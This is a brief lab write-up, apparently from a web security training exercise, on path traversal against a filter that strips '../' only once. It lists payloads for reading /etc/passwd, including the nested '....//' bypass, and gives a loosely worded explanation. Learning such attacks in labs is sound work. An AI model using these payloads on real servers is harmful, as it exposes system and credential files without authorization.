Lab #3 - File path traversal, traversal sequences stripped non-recursively

Target Goal - Retrieve the contents of the /etc/passwd file.

Analysis:

/etc/passwd
../../../../etc/passwd
use ....//....//....//....//etc/passwd

This method works if site strips traversal sequence non-recursively

what this payload does is remove ../, but we have used ../ twice here which will still execute as normal
